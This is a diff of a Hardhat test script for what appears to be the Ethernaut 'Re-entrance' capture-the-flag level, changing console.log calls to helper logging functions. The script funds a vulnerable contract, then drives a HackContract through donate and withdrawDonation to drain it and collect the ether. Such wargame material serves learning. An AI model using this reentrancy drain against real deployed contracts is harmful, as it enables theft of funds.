@@ -1,6 +1,7 @@
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
 const hre = require("hardhat");
+const { consoleLogTitleH1, consoleLogMessage } = require("./utils.js");
 
 describe("Reentrance", function () {
   let deployer;
@@ -8,7 +9,9 @@ describe("Reentrance", function () {
   let tester;
 
   before(async function () {
-    console.log(`💻 Network: ${hre.network.name}`);
+    consoleLogTitleH1("Level 10 - Re-entrance");
+
+    consoleLogMessage(`💻 Network: ${hre.network.name}`);
 
     // 🔨 Addresses
     [deployer, hacker, tester] = await ethers.getSigners();
@@ -25,7 +28,9 @@ describe("Reentrance", function () {
     await contract.deployed();
 
     // ✍ Send some ether to the contract for stealing it in the hack
-    console.log(`✍  Sending ${etherInTheContract} ether to the contract...`);
+    consoleLogMessage(
+      `✍  Sending ${etherInTheContract} ether to the contract...`
+    );
     let tx = await deployer.sendTransaction({
       to: contract.address,
       value: ethers.utils.parseEther(etherInTheContract),
@@ -45,7 +50,7 @@ describe("Reentrance", function () {
     // 👉 Example of normal usage
     if (false) {
       // ✍ Donate some ether as a normal user would do
-      console.log(`✍  Donating ${etherDonation} ether to a user ...`);
+      consoleLogMessage(`✍  Donating ${etherDonation} ether to a user ...`);
       tx = await contract.connect(hacker).donate(hacker.address, {
         value: ethers.utils.parseEther(etherDonation),
       });
@@ -59,7 +64,9 @@ describe("Reentrance", function () {
     }
 
     // 👿 Donate some ether to our HackContract to prepare the hack
-    console.log(`✍  Donating ${etherToWithdraw} ether to the HackContract...`);
+    consoleLogMessage(
+      `✍  Donating ${etherToWithdraw} ether to the HackContract...`
+    );
     tx = await contract.connect(hacker).donate(hackContract.address, {
       value: ethers.utils.parseEther(etherToWithdraw),
     });
@@ -70,19 +77,19 @@ describe("Reentrance", function () {
     ).toString();
 
     // 👿 Hacking the contract
-    console.log("👿 Hacking the contract...");
+    consoleLogMessage("👿 Hacking the contract...");
     tx = await hackContract.connect(hacker).withdrawDonation(
       ethers.utils.parseEther(etherToWithdraw, {
         gasLimit: 1000000,
       })
     );
     tx = await tx.wait((confirms = 1));
-    console.log("👿 Hack hash\n");
-    console.log(tx);
-    console.log("\n");
+    consoleLogMessage("👿 Hack hash\n");
+    consoleLogMessage(tx);
+    consoleLogMessage("\n");
 
     // ✅ Check if the hack was successful
-    console.log("✅ Checking if the hack was successful...");
+    consoleLogMessage("✅ Checking if the hack was successful...");
     let hackContractBalance = (
       await ethers.provider.getBalance(hackContract.address)
     ).toString();
@@ -92,6 +99,6 @@ describe("Reentrance", function () {
     // 👿 Retrieving our earnings to the hacker account
     tx = await hackContract.connect(hacker).withdrawHackEarnings();
     tx = await tx.wait((confirms = 1));
-    console.log("👿 Hack finished\n");
+    consoleLogMessage("👿 Hack finished\n");
   });
 });
